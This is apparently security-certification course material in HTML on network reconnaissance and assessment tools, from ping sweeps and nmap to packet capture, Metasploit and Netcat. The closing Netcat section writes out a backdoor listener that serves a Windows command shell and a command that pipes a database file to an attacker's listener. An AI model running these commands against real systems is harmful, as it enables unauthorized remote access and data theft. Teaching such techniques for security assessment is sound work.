                <h4>Assess Organizational Security with Network Reconnaissance Tools</h4>
                <p><dfn>Reconnaissance</dfn> is a type of assessment activity that maps the potential attack surface by identifying the nodes and connections that make up the network. You will often need to run scans using both command line and GUI topology discovery tools. You will need to report host configurations using fingerprinting tools and capture and analyze network traffic. You should also understand how tools can be used to operate backdoor connections to a host and to covertly exfiltrate data.</p>
                <h4>IPCONFIG, PING, AND ARP</h4>
                <p>The process of mapping out the attack surface is referred to as network reconnaissance and discovery. Reconnaissance techniques are used by threat actors, but they can also be used by security professionals to probe and test their own security systems, as part of a security assessment and ongoing monitoring.</p>
                <p>Topology discovery (or "footprinting") means scanning for hosts, IP ranges, and routes between networks to map out the structure of the target network. Topology discovery can also be used to build an asset database and to identify non-authorized hosts (rogue system detection) or network configuration errors.</p>
                <p>Basic topology discovery tasks can be accomplished using the command line tools built into Windows and Linux. The following tools report the IP configuration and test connectivity on the local network segment or subnet.</p>
                <ul>
                    <li>ipconfig — show the configuration assigned to network interface(s) in Windows, including the hardware or media access control (MAC) address, IPv4 and IPv6 addresses, default gateway, and whether the address is static or assigned by DHCP. If the address is DHCP-assigned, the output also shows the address of the DHCP server that provided the lease.</li>
                    <li>ifconfig — show the configuration assigned to network interface(s) in Linux.</li>
                    <li>ping—probe a host on a particular IP address or host name using Internet Control Message Protocol (ICMP). You can use ping with a simple script to perform a sweep of all the IP addresses in a subnet. The following example will scan the 10.1.0.0/24 subnet from a Windows machine:</li>
                </ul>
                <code>for /l %i in (1,1,255) do @ping -n 1 -w 100 10.1.0.%i | find /i "reply"</code>
                <ul>
                    <li>arp—display the local machine's Address Resolution Protocol (ARP) cache. The ARP cache shows the MAC address of the interface associated with each IP address the local host has communicated with recently. This can be useful if you are investigating a suspected spoofing attack. For example, a sign of a man-in-the-middle attack is where the MAC address of the default gateway IP listed in the cache is not the legitimate router's MAC address.</li>
                </ul>
                <h4>Route and Traceroute</h4>
                <p>The following tools can be used to test the routing configuration and connectivity with remote hosts and networks.</p>
                <ul>
                    <li>route—view and configure the host's local routing table. Most end systems use a default route to forward all traffic for remote networks via a gateway router. If the host is not a router, additional entries in the routing table could be suspicious.</li>
                    <li>tracert—uses ICMP probes to report the round trip time (RTT) for hops between the local host and a host on a remote network. tracert is the Windows version of the tool.</li>
                    <li>traceroute—performs route discovery from a Linux host. traceroute uses UDP probes rather than ICMP, by default.</li>
                    <li>pathping—provides statistics for latency and packet loss along a route over a longer measuring period. pathping is a Windows tool; the equivalent on Linux is mtr.</li>
                </ul>
                <p>In a security context, high latency at the default gateway compared to a baseline might indicate a man-in-the-middle attack. High latency on other hops could be a sign of denial of service, or could just indicate network congestion</p>

                    <summary>Note</summary>
                    <p>In Linux, commands such as ifconfig, arp, route, and traceroute are deprecated and the utilities have not been updated for some years. The iproute2 suite of tools supply replacements for these commands (digitalocean.com/community/tutorials/how-to-use-iproute2-tools-to-manage-network-configuration-on-a-linux-vps).</p>

                <h4>IP SCANNERS AND NMAP</h4>
                <p>Scanning a network using tools such as ping is time-consuming, non-stealthy, and does not return detailed results. Most topology discovery is performed using a dedicated IP scanner tool. An IP scanner performs host discovery and identifies how the hosts are connected together in an internetwork. For auditing, there are enterprise suites, such as Microsoft's System Center products. Such suites can be provided with credentials to perform authorized scans and obtain detailed host information via management protocols, such as the Simple Network Management Protocol (SNMP).</p>
                <p>The Nmap Security Scanner (nmap.org) is one of the most popular open-source IP scanners. Nmap can use diverse methods of host discovery, some of which can operate stealthily and serve to defeat security mechanisms such as firewalls and intrusion detection. The tool is open-source software with packages for most versions of Windows, Linux, and macOS. It can be operated with a command line or via a GUI (Zenmap).</p>      
                <p>The basic syntax of an Nmap command is to get the IP subnet (or IP host address) to scan. When used without switches like this, the default behavior of Nmap is to ping and send a TCP ACK packet to ports 80 and 443 to determine whether a host is present. On a local network segment, Nmap will also perform ARP and ND (Neighbor Discovery) sweeps. If a host is detected, Nmap performs a port scan against that host to determine which services it is running.</p>
                <details>
                    <summary>Note</summary>
                    <p>This OS fingerprinting can be time-consuming on a large IP scope and is also non-stealthy. If you want to perform only host discovery, you can use Nmap with the -sn switch (or -sP in earlier versions) to suppress the port scan.</p>
                </details>

            <section>
                <h4>SERVICE DISCOVERY AND NMAP</h4>
                <p>Having identified active IP hosts on the network and gained an idea of the network topology, the next step in network reconnaissance is to work out which operating systems are in use, which network services each host is running, and, if possible, which application software is underpinning those services. This process is described as service discovery. Service discovery can also be used defensively, to probe potential rogue systems and identify the presence of unauthorized network service ports.</p> 
                <h4>Service Discovery with Nmap</h4>
                <p>When Nmap completes a host discovery scan, it will report on the state of each port scanned for each IP address in the scope. At this point, you can run additional service discovery scans against one or more of the active IP addresses. Some of the principal options for service discovery scans are:</p>
                <ul>
                    <li>TCP SYN (-sS)—this is a fast technique also referred to as half-open scanning, as the scanning host requests a connection without acknowledging it. The target's response to the scan's SYN packet identifies the port state.</li>
                    <li>UDP scans (-sU)—scan UDP ports. As these do not use ACKs, Nmap needs to wait for a response or timeout to determine the port state, so UDP scanning can take a long time. A UDP scan can be combined with a TCP scan.</li>
                    <li>Port range (-p)—by default, Nmap scans 1000 commonly used ports, as listed in its configuration file. Use the -p argument to specify a port range.</li>
                </ul>
                <h4>Service and Version Detection and OS Fingerprinting with Nmap</h4>
                <p>The detailed analysis of services on a particular host is often called fingerprinting. This is because each OS or application software that underpins a network service responds to probes in a unique way. This allows the scanning software to guess at the software name and version, without having any sort of privileged access to the host. This can also be described as banner grabbing, where the banner is the header of the response returned by the application.</p>
                <p>When services are discovered, you can use Nmap with the -sV or -A switch to probe a host more intensively to discover the following information:</p>
                <ul>
                    <li>Protocol — do not assume that a port is being used for its "well known" application protocol. Nmap can scan traffic to verify whether it matches the expected signature (HTTP, DNS, SMTP, and so on).</li>
                    <li>Application name and version—the software operating the port, such as Apache web server or Internet Information Services (IIS) web server.</li>
                    <li>OS type and version—use the -O switch to enable OS fingerprinting (or -A to use both OS fingerprinting and version discovery).</li>
                    <li>Device type—not all network devices are PCs. Nmap can identify switches and routers or other types of networked devices, such as NAS boxes, printers, and webcams.</li>
                </ul>
                <p>Nmap comes with a database of application and version fingerprint signatures, classified using a standard syntax called Common Platform Enumeration (CPE). Unmatched responses can be submitted to a web URL for analysis by the community.

            <section>
                <h4>NETSTAT AND NSLOOKUP</h4>
                <p>Basic service discovery tasks can also be performed using tools built into the Windows and Linux operating systems:</p>
                <ul>
                    <li>netstat — show the state of TCP/UDP ports on the local machine. The same command is used on both Windows and Linux, though with different options syntax. You can use netstat to check for service misconfigurations (perhaps a host is running a web or FTP server that a user installed without authorization). You may also be able to identify suspect remote connections to services on the local host or from the host to remote IP addresses. If you are attempting to identify malware, the most useful netstat output is to show which process is listening on which ports. </li>
                    <li><code>netstat -ano</code>
                        <ul>The netstat commnad has been run with the following switches:
                            <li>-a displays all active TCP and UDP connections, plus TCP connections that the local host has open (listening)</li>
                            <li>-n suppresses name resolution, so host IP addresses and numeric ports are shown in the output</li>
                            <li>-o shows the process ID (PID) of the application or service that has opened the port</li>
                        </ul>
                    </li>
                </ul>
                <img src = "Images\3A_1_Netstat-ano.png" width="800px" height="600px">
                <ul>
                    <li>nslookup/dig—query name records for a given domain using a particular DNS resolver. Under Windows (nslookup) or Linux (nslookup/dig). An attacker may test a network to find out if the DNS service is misconfigured. A misconfigured DNS may allow a zone transfer, which will give the attacker the complete records of every host in the domain, revealing a huge amount about the way the network is configured.</li>
                </ul>

                <h4>OTHER RECONNAISSANCE AND DISCOVERY TOOLS</h4>
                <p>There are hundreds of tools relevant to security assessments, network reconnaissance, vulnerability scanning, and penetration testing. Security distributions specialize in bundling these tools for Linux—notably KALI (kali.org) plus ParrotOS (parrotlinux.org)—and Windows (fireeye.com/blog/threat-research/2019/03/commando-vm-windows-offensive-distribution.html).</p>
                <h4>theHarvester</h4>
                <p>theHarvester is a tool for gathering open-source intelligence (OSINT) for a particular domain or company name (github.com/laramies/theHarvester). It works by scanning multiple public data sources to gather emails, names, subdomains, IPs, URLs and other relevant data.</p>
                <h4>dnsenum</h4>
                <p>While you can use tools such as dig and whois to query name records and hosting details and to check that external DNS services are not leaking too much information, a tool such as dnsenum packages a number of tests into a single query (github.com/fwaeytens/dnsenum). As well as hosting information and name records, dnsenum can try to work out the IP address ranges that are in use.</p>
                <h4>scanless</h4>
                <p>Port scanning is difficult to conceal from detection systems, unless it is performed slowly and results are gathered over an extended period. Another option is to disguise the source of probes. To that end, scanless is a tool that uses third-party sites (github.com/vesche/scanless). This sort of tool is also useful in a defensive sense, by scanning for ports and services that are open but shouldn't be.</p>
                <h4>curl</h4>
                <p>curl is a command line client for performing data transfers over many types of protocol (curl.haxx.se). This tool can be used to submit HTTP GET, POST, and PUT requests as part of web application vulnerability testing. curl supports many other data transfer protocols, including FTP, IMAP, LDAP, POP3, SMB, and SMTP.</p>
                <h4>Nessus</h4>
                <p>The list of services and version information that a host is running can be cross-checked against lists of known software vulnerabilities. This type of scanning is usually performed using automated tools. Nessus, produced by Tenable Network Security (tenable.com/products/nessus/nessus-professional), is one of the best-known commercial vulnerability scanners. It is available in on-premises (Nessus Manager) and cloud (Tenable Cloud) versions, as well as a Nessus Professional version, designed for smaller networks. The product is free to use for home users but paid for on a subscription basis for enterprises. As a previously open-source program, Nessus also supplies the source code for many other scanners.</p>

            <section>
                <h4>PACKET CAPTURE AND TCPDUMP</h4>
                <p>Packet and protocol analysis is another crucial security assessment and monitoring process:</p>
                <ul>
                    <li>Packet analysis refers to deep-down frame-by-frame scrutiny of captured frames.</li>
                    <li>Protocol analysis means using statistical tools to analyze a sequence of packets, or packet trace.</li>
                </ul>
                <p>Packet and protocol analysis depends on a sniffer tool to capture and decode the frames of data. Network traffic can be captured from a host or from a network segment. Using a host means that only traffic directed at that host is captured. Capturing from a network segment can be performed by a switched port analyzer (SPAN) port (or mirror port). This means that a network switch is configured to copy frames passing over designated source ports to a destination port, which the packet sniffer is connected to. Sniffing can also be performed over a network cable segment by using a test access port (TAP). This means that a device is inserted in the cabling to copy frames passing over it. There are passive and active (powered) versions.</p>
                <p>Typically, sniffers are placed inside a firewall or close to a server of particular importance. The idea is usually to identify malicious traffic that has managed to get past the firewall. A single sniffer can generate an exceptionally large amount of data, so you cannot just put multiple sensors everywhere in the network without provisioning the resources to manage them properly. Depending on network size and resources, one or just a few sensors will be deployed to monitor key assets or network paths.</p>
                <p>tcpdump is a command line packet capture utility for Linux (linux.die.net/man/8/tcpdump). The basic syntax of the command is tcpdump -i eth0, where eth0 is the interface to listen on. The utility will then display captured packets until halted manually (Ctrl+C). Frames can be saved to a .pcap file using the -w option. Alternatively, you can open a pcap file using the -r option.</p>
                <p>tcpdump is often used with some sort of filter expression to reduce the number of frames that are captured:</p>
                <ul>
                    <li>Type—filter by host, net, port, or portrange.</li>
                    <li>Direction—filter by source (src) or destination (dst) parameters (host, network, or port).</li>
                    <li>Protocol—filter by a named protocol rather than port number (for example, arp, icmp, ip, ip6, tcp, udp, and so on).</li>
                </ul>
                <p>Filter expressions can be combined by using Boolean operators:</p>
                <ul>
                    <li>and (&&)</li>
                    <li>or (||)</li>
                    <li>not (!)</li>
                </ul>
                <p>Filter syntax can be made even more detailed by using parentheses to group expressions. A complex filter expression should be enclosed by quotes. For example, the following command filters frames to those with the source IP 10.1.0.100 and destination port 53 or 80:</p>
                <code>tcpdump -i eth0 "src host 10.1.0.100 and (dst port 53 or dst port 80)"</code>
            </section>
            <section>
                <h4>PACKET ANALYSIS AND WIRESHARK</h4>
                <p>A protocol analyzer (or packet analyzer) works in conjunction with a sniffer to perform traffic analysis. You can either analyze a live capture or open a saved capture (.pcap) file. Protocol analyzers can decode a captured frame to reveal its contents in a readable format. You can choose to view a summary of the frame or choose a more detailed view that provides information on the OSI layer, protocol, function, and data.</p>
                <p>Wireshark (wireshark.org) is an open-source graphical packet capture and analysis utility, with installer packages for most operating systems. Having chosen the interface to listen on, the output is displayed in a three-pane view. The packet list pane shows a scrolling summary of frames. The packet details pane shows expandable fields in the frame currently selected from the packet list. The packet bytes pane shows the raw data from the frame in hex and ASCII. Wireshark is capable of parsing (interpreting) the headers and payloads of hundreds of network protocols.</p>
                <p>You can apply a capture filter using the same expression syntax as tcpdump (though the expression can be built via the GUI tools too). You can save the output to a .pcap file or load a file for analysis. Wireshark supports very powerful display filters (wiki.wireshark.org/DisplayFilters) that can be applied to a live capture or to a capture file. You can also adjust the coloring rules (wiki.wireshark.org/ColoringRules), which control the row shading and font color for each frame.</p>
                <p>Another useful option is to use the Follow TCP Stream context command to reconstruct the packet contents for a TCP session.</p>
                <details>
                    <summary>Note</summary>
                    <p>The PCAP file format has some limitations, which has led to the development of PCAP Next Generation (PCAPNG). Wireshark now uses PCAPNG by default, and tcpdump can process files in the new format too.</p>
                </details>

            <section>
                <h4>PACKET INJECTION AND REPLAY</h4>
                <p>Some reconnaissance techniques and tests depend on sending forged or spoofed network traffic. Often, network sniffing software libraries allow frames to be inserted (or injected) into the network stream. There are also tools that allow for different kinds of packets to be crafted and manipulated. Well-known tools used for packet injection include Ettercap (ettercap-project.org), Scapy (scapy.net), and hping (linux.die.net/man/8/hping3)</p>
                <h4>hping</h4>
                <p>hping is an open-source spoofing tool that provides a penetration tester with the ability to craft network packets to exploit vulnerable firewalls and IDSs. hping can perform the following types of tests: </p>
                <ul>
                    <li>Host/port detection and firewall testing—like Nmap, hping can be used to probe IP addresses and TCP/UDP ports for responses.</li>
                    <li>Traceroute—if ICMP is blocked on a local network, hping offers alternative ways of mapping out network routes. hping can use arbitrary packet formats, such as probing DNS ports using TCP or UDP, to perform traces.</li>
                    <li>Denial of service (DoS)—hping can be used to perform flood-based DoS attacks from randomized source IPs. This can be used in a test environment to determine how well a firewall, IDS, or load balancer responds to such attacks.</li>
                </ul>
                <h4>tcpreplay</h4>
                <p>As the name suggests, tcpreplay takes previously captured traffic that has been saved to a .pcap file and replays it through a network interface (linux.die.net/man/1/tcpreplay). Optionally, fields in the capture can be changed, such as substituting MAC or IP addresses. tcpreplay is useful for analysis purposes. If you have captured suspect traffic, you can replay it through a monitored network interface to test intrusion detection rules.</p>

                <h4>EXPLOITATION FRAMEWORKS</h4>
                <p>A remote access trojan (RAT) is malware that gives an adversary the means of remotely accessing the network. From the perspective of security posture assessment, a penetration tester might want to try to establish this sort of connection and attempt to send corporate information over the channel (data exfiltration). If security controls are working properly, this attempt should be defeated (or at least detected).</p>
                <p>An exploitation framework uses the vulnerabilities identified by an automated scanner and launches scripts or software to attempt to deliver matching exploits. This might involve considerable disruption to the target, including service failure, and risk data security.</p>
                <p>The framework comprises a database of exploit code, each targeting a particular CVE (Common Vulnerabilities and Exposures). The exploit code can be coupled with modular payloads. Depending on the access obtained via the exploit, the payload code may be used to open a command shell, create a user, install software, and so on. The custom exploit module can then be injected into the target system. The framework may also be able to obfuscate the code so that it can be injected past an intrusion detection system or antivirus software.</p>
                <p>The best-known exploit framework is Metasploit (metasploit.com). The platform is open-source software, now maintained by Rapid7. There is a free framework (command line) community edition with installation packages for Linux and Windows. Rapid7 produces pro and express commercial editions of the framework and it can be closely integrated with the Nexpose vulnerability scanner.</p>
                <p>Sn1per (github.com/1N3/Sn1per) is a framework designed for penetration test reporting and evidence gathering. It can integrate with other tools such as Metasploit and Nikto to run automated suites of tests. Results can be displayed as web reports. </p>
                <p>There are many other exploitation frameworks targeting different kinds of vulnerabilities. Some examples include:</p>
                <ul>
                    <li>fireELF—injecting fileless exploit payloads into a Linux host (github.com/rek7/fireELF).</li>

                <h4>NETCAT</h4>
                <p>One simple but effective tool for testing connectivity is Netcat (nc), available for both Windows and Linux. Netcat is a computer networking utility for reading and writing raw data over a network connection, and can be used for port scanning and fingerprinting. For example, the following command attempts to connect to the HTTP port on a server and return any banner by sending the "head" HTTP keyword:</p>
                <code>echo "head" | nc 10.1.0.1 -v 80</code>
                <p>Netcat can also establish connections with remote machines. To configure Netcat as a backdoor, you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:</p>
                <code>nc -l -p 666 -e cmd.exe</code>
                <p>The following command connects to the listener and grants access to the terminal:</p>
                <code>nc 10.1.0.1 666</code>
                <p>Used the other way around, Netcat can be used to receive files. For example, on the target system the attacker runs the following:</p>
                <code>type accounts.sql | nc 10.1.0.192 6666</code>    
                <p>On the handler (IP 10.1.0.192), the attacker receives the file using the following command:</p>    
                <code>nc -l -p 6666 > accounts.sql</code>
